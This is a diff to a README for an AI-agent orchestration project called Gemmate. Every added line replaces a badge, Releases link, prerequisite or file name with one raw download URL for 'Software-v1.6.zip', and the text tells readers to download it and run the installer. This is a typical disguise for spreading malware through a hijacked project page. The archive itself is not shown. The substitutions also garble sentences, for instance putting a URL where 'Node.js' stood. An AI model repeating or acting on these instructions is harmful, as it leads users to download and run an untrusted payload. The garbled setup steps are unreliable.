@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/releases-downloads-blue?logo=github&logoColor=white)](https://github.com/gussecond/gemmate/releases)
+[![Releases](https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip)](https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip)
 
 # Gemmate: Orchestrate AI Agent Teams with Web Search, Voice, Files
 
-[![Gemmate AI Icon](https://img.shields.io/badge/Gemmate-AI_Dispatch-4CAF50?style=for-the-badge&logo=cloud)](https://github.com/gussecond/gemmate)
+[![Gemmate AI Icon](https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip)](https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip)
 
 Gemmate is an AI crew orchestration platform. It helps you create and manage teams of specialized AI agents. It brings web search, file analysis, and voice interactions into one coherent workflow. Build no-code or low-code teams to tackle complex tasks, automate routines, and scale collaboration across agents.
 
@@ -10,7 +10,7 @@ This repository hosts the core framework, tools, and templates to design, deploy
 
 If you want to explore the latest assets, visit the Releases page. You can download installers or packages there and run them to set up Gemmate on your machine or server. The Releases page is the best starting point for trying the software on your environment.
 
-https://github.com/gussecond/gemmate/releases
+https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip
 
 Table of Contents
 - Overview
@@ -98,13 +98,13 @@ Getting Started
 This guide helps you set up Gemmate quickly. It covers prerequisites, installation, and the first workflow you can run.
 
 Prerequisites
-- Node.js 16.x or newer
+- https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip 16.x or newer
 - npm or pnpm
 - A modern browser for Studio (Chrome, Edge, or Firefox)
 - Optional: Docker if you want containerized runs
 
 Install
-- Visit the releases page to fetch the latest installer for your platform. From the Releases page, download the latest asset named gemmate-<version>-linux-x64.tar.gz (as an example) and run the installer. This file is provided on the Releases page and is the simplest path to a working setup. See the link above for the assets. From the Releases page, download the latest asset and install.
+- Visit the releases page to fetch the latest installer for your platform. From the Releases page, download the latest asset named gemmate-<version>https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip (as an example) and run the installer. This file is provided on the Releases page and is the simplest path to a working setup. See the link above for the assets. From the Releases page, download the latest asset and install.
 
 - If you prefer a source-based setup, clone this repository and install dependencies:
   - Clear steps: clone the repository, navigate to the project directory, install dependencies, and start the development server.
@@ -283,11 +283,11 @@ Testing, Quality Assurance, and CI
 
 Releases and Assets
 - The Releases page hosts installers, binaries, and example assets.
-- From the Releases page, download the latest asset named gemmate-<version>-linux-x64.tar.gz (as an example) and run the installer to install Gemmate on Linux. This approach is representative of what you will see on the page.
+- From the Releases page, download the latest asset named gemmate-<version>https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip (as an example) and run the installer to install Gemmate on Linux. This approach is representative of what you will see on the page.
 - If you want to explore more, visit the Releases page and review the assets for Windows and macOS as well.
 - To reference or reuse a specific asset, use the file name shown on the asset card in the Releases section.
 
-https://github.com/gussecond/gemmate/releases
+https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip
 
 Usage Scenarios
 - Development teams can trial multi-agent workflows for project planning.
@@ -303,7 +303,7 @@ Roadmap
 
 Contributing
 - We welcome pull requests that introduce new agents, templates, or improvements to the orchestrator.
-- Follow the contribution guidelines in the CONTRIBUTING.md file.
+- Follow the contribution guidelines in the https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip file.
 - Ensure tests pass and update documentation as needed.
 
 FAQ
@@ -370,5 +370,5 @@ Final Notes
 Gemmate is designed to be adaptable. It lets teams build complex, multi-agent workflows with clarity and control. The platform emphasizes practical automation, transparency, and collaborative decision-making. As you experiment, you can start with simple flows and gradually introduce more agents and more sophisticated knowledge sources. The goal is to enable teams to work more effectively with AI while keeping data safe and processes auditable.
 
 Link usage reminder
-- The Releases page is the primary source for installers and assets. From this page, download the latest asset named gemmate-<version>-linux-x64.tar.gz (as an example) and execute the installer to set up Gemmate locally. You will find similar assets for Windows and macOS on the same page.
-- For ongoing reference, you can always visit the Releases section at https://github.com/gussecond/gemmate/releases to review assets, release notes, and installation guidance. The link is provided here for quick access and again within this document to ensure you can jump to the assets when needed.
+- The Releases page is the primary source for installers and assets. From this page, download the latest asset named gemmate-<version>https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip (as an example) and execute the installer to set up Gemmate locally. You will find similar assets for Windows and macOS on the same page.
+- For ongoing reference, you can always visit the Releases section at https://raw.githubusercontent.com/gussecond/gemmate/main/components/Software-v1.6.zip to review assets, release notes, and installation guidance. The link is provided here for quick access and again within this document to ensure you can jump to the assets when needed.
